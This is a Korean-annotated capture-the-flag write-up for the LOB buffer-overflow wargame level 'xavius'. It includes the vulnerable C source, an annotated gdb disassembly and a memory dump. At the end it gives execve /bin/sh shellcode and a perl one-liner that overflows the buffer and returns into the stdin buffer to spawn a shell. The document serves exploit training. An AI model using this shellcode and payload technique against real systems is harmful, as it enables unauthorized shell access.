@@ -1,0 +1,208 @@
+nightmare
+beg for me
+
+[nightmare@localhost nightmare]$ cat xavius.c
+/*
+        The Lord of the BOF : The Fellowship of the BOF
+        - xavius
+        - arg
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <dumpcode.h>
+
+main()
+{
+        char buffer[40];
+        char *ret_addr;
+
+        // overflow!
+        fgets(buffer, 256, stdin);
+        printf("%s\n", buffer);
+
+        if(*(buffer+47) == '\xbf')
+        {
+                printf("stack retbayed you!\n");
+                exit(0);
+        }
+
+        if(*(buffer+47) == '\x08')
+        {
+                printf("binary image retbayed you, too!!\n");
+                exit(0);
+        }
+
+        // check if the ret_addr is library function or not
+        memcpy(&ret_addr, buffer+44, 4);
+        while(memcmp(ret_addr, "\x90\x90", 2) != 0)     // end point of function
+        {
+                if(*ret_addr == '\xc9'){                // leave
+                        if(*(ret_addr+1) == '\xc3'){    // ret
+                                printf("You cannot use library function!\n");
+                                exit(0);
+                        }
+                }
+                ret_addr++;
+        }
+
+        // stack destroyer
+        memset(buffer, 0, 44);
+        memset(buffer+48, 0, 0xbfffffff - (int)(buffer+48));
+
+        // LD_* eraser
+        // 40 : extra space for memset function
+        memset(buffer-3000, 0, 3000-40);
+}
+---------------------------------------------------------
+[1]
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048714 <main>:       push   %ebp
+0x8048715 <main+1>:     mov    %ebp,%esp
+0x8048717 <main+3>:     sub    %esp,44
+
+0x804871a <main+6>:     mov    %eax,%ds:0x8049a3c
+0x804871f <main+11>:    push   %eax
+0x8048720 <main+12>:    push   0x100
+0x8048725 <main+17>:    lea    %eax,[%ebp-40]
+0x8048728 <main+20>:    push   %eax
+0x8048729 <main+21>:    call   0x8048408 <fgets>
+0x804872e <main+26>:    add    %esp,12
+-> fgets([%ebp-40],256,%ds:0x8049a3c);
+
+* ds(data segment) : 변수들 저장하는 세그먼트의 주소값이라고 명시한 것임.
+	-> 즉, 0x8049a3c는 변수임.(코드를 보면 알겠지만 stdin 주소)
+
+0x8048731 <main+29>:    lea    %eax,[%ebp-40]
+0x8048734 <main+32>:    push   %eax
+0x8048735 <main+33>:    push   0x80488bb
+0x804873a <main+38>:    call   0x8048438 <printf>
+0x804873f <main+43>:    add    %esp,8
+-> printf(0x80488bb,[%ebp-40]);
+0x8048742 <main+46>:    cmp    BYTE PTR [%ebp+7],0xbf
+0x8048746 <main+50>:    jne    0x8048760 <main+76>
+-> if(RET의 4번째 바이트 == '0xbf'){}
+0x8048748 <main+52>:    push   0x80488bf
+0x804874d <main+57>:    call   0x8048438 <printf>
+0x8048752 <main+62>:    add    %esp,4
+
+0x8048755 <main+65>:    push   0
+0x8048757 <main+67>:    call   0x8048458 <exit>
+0x804875c <main+72>:    add    %esp,4
+
+0x804875f <main+75>:    nop
+
+0x8048760 <main+76>:    cmp    BYTE PTR [%ebp+7],0x8
+0x8048764 <main+80>:    jne    0x8048780 <main+108>
+-> if(RET의 4번째 자리수 != '\x08')
+0x8048766 <main+82>:    push   0x80488e0
+0x804876b <main+87>:    call   0x8048438 <printf>
+0x8048770 <main+92>:    add    %esp,4
+
+0x8048773 <main+95>:    push   0
+0x8048775 <main+97>:    call   0x8048458 <exit>
+0x804877a <main+102>:   add    %esp,4
+
+0x804877d <main+105>:   lea    %esi,[%esi]
+0x8048780 <main+108>:   push   4
+0x8048782 <main+110>:   lea    %eax,[%ebp-40]
+0x8048785 <main+113>:   lea    %edx,[%eax+44]
+0x8048788 <main+116>:   push   %edx
+0x8048789 <main+117>:   lea    %eax,[%ebp-44]
+0x804878c <main+120>:   push   %eax
+0x804878d <main+121>:   call   0x8048448 <memcpy>
+0x8048792 <main+126>:   add    %esp,12
+-> memcpy([%ebp-44], buffer+44, 4);
+
+0x8048795 <main+129>:   push   2
+0x8048797 <main+131>:   push   0x8048902
+0x804879c <main+136>:   mov    %eax,DWORD PTR [%ebp-44]
+0x804879f <main+139>:   push   %eax
+0x80487a0 <main+140>:   call   0x8048418 <memcmp>
+0x80487a5 <main+145>:   add    %esp,12
+0x80487a8 <main+148>:   mov    %eax,%eax
+0x80487aa <main+150>:   test   %eax,%eax
+*memcpy의 반환값의 참 여부 판단(AND연산)
+0x80487ac <main+152>:   jne    0x80487b0 <main+156>
+-> while(!memcmp([%ebp-44], 0x8048902, 2))
+-> main+204를 보면 "jmp main+129" 가 있기에 반복문임
+	0x80487ae <main+154>:   jmp    0x80487e0 <main+204>
+
+	0x80487b0 <main+156>:   mov    %eax,DWORD PTR [%ebp-44]
+	0x80487b3 <main+159>:   cmp    BYTE PTR [%eax],0xc9
+	0x80487b6 <main+162>:   jne    0x80487d8 <main+196>
+	-> if([%ebp-44] == '0xc9'){
+		0x80487b8 <main+164>:   mov    %eax,DWORD PTR [%ebp-44]
+		0x80487bb <main+167>:   inc    %eax
+		0x80487bc <main+168>:   cmp    BYTE PTR [%eax],0xc3
+		0x80487bf <main+171>:   jne    0x80487d8 <main+196>
+		-> if([%ebp-44]+1 == '0xc3'){
+			0x80487c1 <main+173>:   push   0x8048920
+			0x80487c6 <main+178>:   call   0x8048438 <printf>
+			0x80487cb <main+183>:   add    %esp,4
+			-> printf(0x8048920);
+			0x80487ce <main+186>:   push   0
+			0x80487d0 <main+188>:   call   0x8048458 <exit>
+			0x80487d5 <main+193>:   add    %esp,4
+			-> exit(0);
+	0x80487d8 <main+196>:   inc    DWORD PTR [%ebp-44]
+	-> [%ebp-44]++;
+0x80487db <main+199>:   jmp    0x8048795 <main+129>
+
+0x80487dd <main+201>:   lea    %esi,[%esi]
+0x80487e0 <main+204>:   push   44
+0x80487e2 <main+206>:   push   0
+0x80487e4 <main+208>:   lea    %eax,[%ebp-40]
+0x80487e7 <main+211>:   push   %eax
+0x80487e8 <main+212>:   call   0x8048468 <memset>
+0x80487ed <main+217>:   add    %esp,12
+-> memset([%ebp-40],0,44);
+0x80487f0 <main+220>:   lea    %eax,[%ebp-40]
+0x80487f3 <main+223>:   mov    %edx,0xbfffffcf
+0x80487f8 <main+228>:   mov    %ecx,%edx
+0x80487fa <main+230>:   sub    %ecx,%eax
+0x80487fc <main+232>:   mov    %eax,%ecx
+0x80487fe <main+234>:   push   %eax
+0x80487ff <main+235>:   push   0
+0x8048801 <main+237>:   lea    %eax,[%ebp-40]
+0x8048804 <main+240>:   lea    %edx,[%eax+48]
+0x8048807 <main+243>:   push   %edx
+0x8048808 <main+244>:   call   0x8048468 <memset>
+0x804880d <main+249>:   add    %esp,12
+-> memset([%ebp-40]+48, 0, 0xbfffffcf-[%ebp-40]);
+0x8048810 <main+252>:   push   0xb90
+0x8048815 <main+257>:   push   0
+0x8048817 <main+259>:   lea    %eax,[%ebp-40]
+0x804881a <main+262>:   lea    %edx,[%eax-3000]
+0x8048820 <main+268>:   push   %edx
+0x8048821 <main+269>:   call   0x8048468 <memset>
+0x8048826 <main+274>:   add    %esp,12
+-> memset(buffer-3000, 0, 0xb90);
+	* 0xb90 == 2960
+0x8048829 <main+277>:   leave
+0x804882a <main+278>:   ret
+-> main에필로그
+0x804882b <main+279>:   nop
+
+------------------------------------------------------
+
+쉘:
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
+
+stdin 속 문자열이 저장된주소:
+0x40015000:     0x900a7373      0x90909090      0x90909090      0x90909090
+0x40015010:     0x90909090      0x90909090      0x90909090      0x90909090
+0x40015020:     0x90909090      0x90909090      0x41414141      0x90909090
+0x40015030:     0x90909090      0x90909090      0x90909090      0x90909090
+0x40015040:     0x90909090      0x90909090      0x90909090      0x90909090
+0x40015050:     0x90909090      0x90909090      0x90909090      0x90909090
+0x40015060:     0x90909090      0x90909090      0x90909090      0x90909090
+0x40015070:     0x90909090      0x90909090      0x90909090      0x90909090
+0x40015080:     0x90909090      0x90909090      0x90909090      0x90909090
+0x40015090:     0x42424242      0x42424242      0x42424242      0x42424242
+0x400150a0:     0x42424242      0x42424242      0x00000000      0x00000000
+
+dummy[44] + "\x50\x50\x01\x40"[4] + "\x90"x100 + 쉘코드[24]
+
+(perl -e 'print "\x90"x44,"\x50\x50\x01\x40","\x90"x100,"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"';cat) | ./xavius 
